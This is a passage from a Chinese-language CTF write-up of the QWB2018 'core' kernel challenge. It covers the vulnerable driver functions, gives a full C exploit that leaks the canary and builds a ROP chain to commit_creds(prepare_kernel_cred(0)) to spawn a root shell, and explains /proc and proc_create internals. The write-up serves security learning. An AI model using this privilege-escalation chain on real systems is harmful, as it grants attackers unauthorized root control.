class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">QWB2018_core [master●●] cat exploit.c </span><br><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="延拓1"><a href="#延拓1" class="headerlink" title="延拓1"></a>延拓1</h2><p>在这道例题中可以看到模块在初始化函数中主要是调用proc_create函数</p><p>要了解这个函数首先先了解一下/proc文件系统</p><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><blockquote><p>在许多类 Unix计算机系统中,<strong>procfs</strong> 是 进程文件系统(process file system) 的缩写,包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 <code>/proc</code> 目录。由于 <code>/proc</code> <strong>不是一个真正的文件系统</strong>，它也就不占用存储空间，只是占用有限的内存。</p></blockquote><p><strong>创建一个 proc 虚拟文件，应用层通过读写该文件，即可实现与内核的交互。</strong></p><p>Linux中每个正在运行的进程对应于<code>/proc</code>下的一个目录，目录名就是进程的PID，每个目录包含:</p><ul><li>/proc/PID/cmdline, 启动该进程的命令行.</li><li>/proc/PID/cwd, 当前工作目录的符号链接</li><li>/proc/PID/environ 影响进程的环境变量的名字和值.</li><li>/proc/PID/exe, 最初的可执行文件的符号链接, 如果它还存在的话。</li><li>/proc/PID/fd, 一个目录，包含每个打开的文件描述符的符号链接.</li><li>/proc/PID/fdinfo, 一个目录，包含每个打开的文件描述符的位置和标记</li><li>/proc/PID/maps, 一个文本文件包含内存映射文件与块的信息。</li><li>/proc/PID/mem, 一个二进制图像(image)表示进程的虚拟内存, 只能通过ptrace化进程访问.</li><li>/proc/PID/root, 该进程所能看到的根路径的符号链接。如果没有chroot监狱，那么进程的根路径是/.</li><li>/proc/PID/status包含了进程的基本信息，包括运行状态、内存使用。</li><li>/proc/PID/task, 一个目录包含了硬链接到该进程启动的任何任务</li></ul><p>用户可以获得PID使用工具如pgrep, pidof或ps:</p><h3 id="伪文件系统"><a href="#伪文件系统" class="headerlink" title="伪文件系统"></a>伪文件系统</h3><p>上面提到的伪文件系统又是什么,和普通文件系统有什么不同</p><ol><li><strong>实现方式</strong>:<ul><li><strong>普通文件系统</strong>：通常是针对块设备（硬盘、分区等）或其他<u>存储介质的实际文件系统</u>，例如 ext4、FAT32、NTFS 等。这些文件系统实现了<u>对物理存储介质的管理</u>，包括文件的组织、存储、检索等操作。</li><li><strong>伪文件系统</strong>：是在内存中实现的，不涉及对物理存储介质的直接访问。它提供了一种访问内核状态和信息的机制，通过<u>在文件系统层次结构中创建伪文件</u>，用户和进程可以通过文件 I/O 接口来访问和修改内核的状态。</li></ul></li><li><strong>目的</strong>:<ul><li><strong>普通文件系统</strong>：主要用于存储和管理用户数据，提供了对数据的持久性存储和检索支持。这些文件系统通常关注于数据的长期保存和管理。</li><li><strong>伪文件系统</strong>：用于提供一种用户空间和内核空间之间的通信机制。通过伪文件系统，用户可以访问内核中的信息，例如系统状态、进程信息、设备信息等。这样的文件系统并非用于长期存储数据，而是用于提供一个接口来查询和配置内核状态。</li></ul></li><li><strong>位置</strong>:<ul><li><strong>普通文件系统</strong>：存储在物理存储介质上，例如硬盘、SSD 等。</li><li><strong>伪文件系统</strong>：存储在内存中，通常在 <code>/proc</code> 和 <code>/sys</code> 目录下，用于让用户和进程通过文件接口与内核进行通信。</li></ul></li></ol><p>经典的伪文件系统包括 <code>/proc</code> 和 <code>/sys</code>：</p><ul><li><code>/proc</code> 提供了对系统和进程信息的访问，例如 <code>/proc/cpuinfo</code> 可以查看 CPU 信息，<code>/proc/meminfo</code> 可以查看内存信息。</li><li><code>/sys</code> 则提供了对内核和设备参数的访问，例如 <code>/sys/class/gpio</code> 可以用于控制 GPIO。</li></ul><p>特别的伪文件系统只存在于内存中,不存在于硬盘中</p><h3 id="proc-create"><a href="#proc-create" class="headerlink" title="proc_create"></a>proc_create</h3><p>例题中使用了proc_create函数和remove_proc_entry</p><p>着重研究一下前者,毕竟后者想来是前者的逆操作</p><p>源码在内核<code>/fs/proc/generic.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> proc_create_data(name, mode, parent, proc_ops, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create);</span><br></pre></td></tr></table></figure><p>四个参数分别是</p><ol><li><code>name</code>,要创建的文件夹的名字</li><li><code>mode</code>,创建的文件夹的权限模式,<u>八进制</u>下的UGO模式</li><li><code>parent</code>,要创建节点的父节点,也就是要在哪个文件夹之下创建新文件夹，需要将那个文件夹的 proc_dir_entry 传入。如果直接在/proc/目录下则不需要</li><li><code>proc_ops</code>该文件的操作函数</li></ol><hr><p>其中还涉及到两个结构体proc_dir_entry和proc_ops</p><p>proc_ops是一个用于存放要注册的函数指针的结构体,之后对打开的设备文件调用对应函数便会指向这些函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> proc_flags;</span><br><span class="line"><span class="type">int</span>(*proc_open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_read)(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*proc_read_iter)(<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_write)(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="comment">/* mandatory unless nonseekable_open() or equivalent is used */</span></span><br><span class="line"><span class="type">loff_t</span>(*proc_lseek)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span>(*proc_release)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">__poll_t</span> (*proc_poll)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span>(*proc_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">long</span>(*proc_compat_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span>(*proc_mmap)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*proc_get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>proc_dir_entry则是proc文件系统下目录的存储结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * number of callers into module in progress;</span></span><br><span class="line"><span class="comment"> * negative -&gt; it&#x27;s going away RSN</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span> in_use;</span><br><span class="line"><span class="type">refcount_t</span> refcnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pde_openers</span>;</span><span class="comment">/* who did -&gt;open, but not -&gt;release */</span></span><br><span class="line"><span class="comment">/* protects -&gt;pde_openers and all struct pde_opener instances */</span></span><br><span class="line"><span class="type">spinlock_t</span> pde_unload_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span 